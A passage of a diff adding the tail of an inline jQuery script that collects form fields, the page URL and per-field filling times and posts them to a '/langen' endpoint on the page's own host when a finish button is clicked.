+          formData['s5'] = 'backuser';
+          formData['url'] = window.location.href;
+          formData['email_s'] = formData['s6'];
+          if (formData["gender"] == undefined && $('[name=gender]').length > 0) {
+            formData["gender"] = $("[name=gender]").val();
+          }
+          formData = getAdditionalInfo(formData);
+          for (var key in trackInputTime) {
+            formData['filling_time_' + key] = ((trackInputTime[key].end - trackInputTime[key].start) / 1000).toFixed(3);
+          }
+          $.ajax({
+            url: window.location.protocol + '//' + window.location.hostname + '/langen', type: 'POST', data: {
+             form_data: formData, url: window.location.href, s1: '50244', s2: '1850758',                }
+             , dataType: 'JSON',            }
+          );
+          callback(event, target);
+        }
+        if (typeof imiFinButClickSubscribe === 'function') {
+          imiFinButClickSubscribe(processLangen);
+        }
+        else {
+          $('a.btn-fin').on('click', function (e) {
+            processLangen(e, e.target, function (e, t) {
+              return true;
+            }
+                          );
+          }
+                            );
+        }
+      }
+                        );
+    </script></body></html>
